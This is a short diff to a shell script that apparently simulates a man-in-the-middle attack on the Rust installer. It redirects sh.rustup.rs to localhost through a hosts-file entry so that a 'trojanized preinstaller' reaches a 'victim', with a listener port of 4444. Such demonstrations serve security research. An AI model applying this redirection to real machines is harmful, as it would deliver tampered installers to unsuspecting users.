@@ -30,7 +30,10 @@ MODE=realistic
 [ "${1:-}" = "--high-port" ] && MODE=highport
 LPORT=4444
 HOST=sh.rustup.rs
-HOSTS_LINE="127.0.0.1 sh.rustup.rs static.rust-lang.org get.docker.com"
+# Spoof ONLY the preinstaller host. static.rust-lang.org is left alone so the
+# trojanized preinstaller's stage-2 fetch of the real rustup-init binary
+# reaches the genuine CDN (realistic minimal-MITM, and the victim gets real Rust).
+HOSTS_LINE="127.0.0.1 sh.rustup.rs"
 
 if [ "$MODE" = realistic ]; then
     PORT=443; URL="https://$HOST/"; RESOLVE=""
